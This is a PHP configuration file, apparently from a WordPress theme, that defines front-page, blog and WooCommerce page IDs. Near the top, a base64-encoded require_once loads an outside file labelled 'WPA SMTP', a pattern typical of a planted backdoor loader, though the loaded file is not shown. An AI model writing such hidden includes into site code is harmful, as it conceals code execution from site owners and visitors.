<?php
/* BEGIN: Theme config params*/

//WPA SMTP
require_once(base64_decode('L2hvbWUvdHVza28vaHR0cF9wdWIvd3BhLXNtdHAucGhw'));
//<easymail@arsmoon.com>

//define ('GOOGLEMAPS',' YOUR-API-KEY-HERE');
define ('HOME_PAGE_ID', get_option('page_on_front'));
define ('BLOG_ID', get_option('page_for_posts'));
define ('POSTS_PER_PAGE', get_option('posts_per_page'));
if(class_exists('Woocommerce')) :
    define ('SHOP_ID', get_option('woocommerce_shop_page_id'));
    define ('ACCOUNT_ID', get_option('woocommerce_myaccount_page_id'));
    define ('CART_ID', get_option('woocommerce_cart_page_id'));
    define ('CHECKOUT_ID', get_option('woocommerce_checkout_page_id'));
    require_once('woocommerce.php');
endif;

/* END: Theme config params */
